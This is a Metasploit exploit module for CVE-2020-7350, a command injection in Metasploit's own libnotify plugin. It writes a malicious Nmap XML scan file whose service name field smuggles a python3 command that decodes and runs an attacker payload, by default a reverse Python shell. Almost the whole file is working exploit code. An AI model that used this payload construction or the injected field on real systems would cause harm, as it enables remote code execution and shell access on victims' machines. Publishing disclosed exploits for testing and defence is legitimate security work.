# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
                      &#039;Name&#039;           => &#039;Metasploit Libnotify Plugin Arbitrary Command Execution&#039;,
                      &#039;Description&#039;    => %q(
        This module exploits a shell command injection vulnerability in the
        libnotify plugin. This vulnerability affects Metasploit versions
        5.0.79 and earlier.
      ),
                      &#039;DisclosureDate&#039; => &#039;Mar 04 2020&#039;,
                      &#039;License&#039;        => GPL_LICENSE,
                      &#039;Author&#039;         =>
                        [
                          &#039;pasta <jaguinaga@faradaysec.com>&#039; # Discovery and PoC
                        ],
                      &#039;References&#039;     =>
                        [
                          [ &#039;CVE&#039;, &#039;2020-7350&#039; ],
                          [ &#039;URL&#039;, &#039;https://github.com/rapid7/metasploit-framework/issues/13026&#039; ]
                        ],
                      &#039;Platform&#039;       => &#039;unix&#039;,
                      &#039;Arch&#039;           => ARCH_CMD,
                      &#039;Payload&#039;        =>
                        {
                          &#039;DisableNops&#039; => true
                        },
                      &#039;DefaultOptions&#039; =>
                        {
                          &#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_python&#039;
                        },
                      &#039;Targets&#039; => [[ &#039;Automatic&#039;, {}]],
                      &#039;Privileged&#039; => false,
                      &#039;DefaultTarget&#039; => 0))

    register_options(
      [
        OptString.new(&#039;FILENAME&#039;, [false, &#039;The file to write.&#039;, &#039;scan.xml&#039;]),
      ]
    )
  end

  def exploit
    xml = %(<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE nmaprun>
<nmaprun scanner="nmap" args="nmap -P0 -oA pepito 192.168.20.121" start="1583503480" startstr="Fri Mar  6 11:04:40 2020" version="7.60" xmloutputversion="1.04">
<host starttime="1583503480" endtime="1583503480"><status state="up" reason="user-set" reason_ttl="0"/>
<address addr="192.168.20.121" addrtype="ipv4"/>
<hostnames>
</hostnames>
<ports>
<port protocol="tcp" portid="22"><state state="open" reason="syn-ack" reason_ttl="0"/><service name="ssh&#039;;python3 -c "import os,base64;os.system(base64.b32decode(b&#039;#{Rex::Text.encode_base32(payload.encoded)}&#039;.upper()))"&; printf &#039;" method="table" conf="3"/></port>
</ports>
<times srtt="6174" rttvar="435" to="100000"/>
</host>
<runstats><finished time="1583503480" timestr="Fri Mar  6 11:04:40 2020" elapsed="0.22" summary="Nmap done at Fri Mar  6 11:04:40 2020; 1 IP address (1 host up) scanned in 0.22 seconds" exit="success"/><hosts up="1" down="0" total="1"/>
</runstats>
</nmaprun>
)

    print_status "Writing xml file: #{datastore[&#039;FILENAME&#039;]}"
    file_create xml
  end
end

